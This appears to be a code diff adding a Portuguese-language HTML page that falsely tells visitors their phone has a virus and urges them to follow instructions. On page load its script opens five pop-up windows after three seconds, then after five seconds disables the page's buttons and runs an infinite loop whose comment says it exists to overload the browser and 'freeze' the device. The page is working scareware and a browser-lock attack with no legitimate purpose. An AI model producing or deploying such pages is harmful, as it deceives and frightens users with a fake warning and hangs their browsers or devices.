@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviso de Vírus</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #111;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* Desabilita rolagem */
+        }
+
+        .container {
+            text-align: center;
+            background-color: #2b2b2b;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            color: #ff0000;
+            text-shadow: 2px 2px 5px rgba(255, 0, 0, 0.7);
+            animation: pulse 1s infinite;
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin-top: 20px;
+            color: #f1f1f1;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .alert-box {
+            margin-top: 30px;
+            padding: 20px;
+            border: 2px solid #ff0000;
+            border-radius: 8px;
+            background-color: rgba(255, 0, 0, 0.1);
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+
+        .alert-box strong {
+            color: #ff0000;
+        }
+
+        button {
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1rem;
+            cursor: not-allowed;
+        }
+    </style>
+    <script>
+        // Lista de URLs aleatórias
+        const urls = [
+            "https://example.com",
+            "https://another-example.com",
+            "https://random-site.com",
+            "https://fake-site.com"
+        ];
+
+        // Função para abrir pop-ups aleatórios
+        function openRandomPopups() {
+            for (let i = 0; i < 5; i++) { // Número de pop-ups
+                const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+                window.open(randomUrl, "_blank", "width=500,height=500");
+            }
+        }
+
+        // Função de "travamento" do celular simulado
+        function simulateFreeze() {
+            // Desabilitar todos os botões
+            const buttons = document.querySelectorAll("button");
+            buttons.forEach(button => button.disabled = true);
+
+            // Loop infinito para sobrecarregar o navegador
+            while (true) {
+                console.log("Dispositivo travado!");
+            }
+        }
+
+        // Abre os pop-ups após 3 segundos e inicia o "travamento" após 5 segundos
+        window.onload = function() {
+            setTimeout(openRandomPopups, 3000);
+            setTimeout(simulateFreeze, 5000); // Inicia "travamento"
+        };
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Seu celular agora está com vírus!</h1>
+        <p>Por favor, siga as instruções para evitar danos.</p>
+        <div class="alert-box">
+            <strong>Aviso:</strong> Não ignore esta mensagem!
+        </div>
+        <button>Botão Desabilitado</button>
+    </div>
+</body>
+</html>
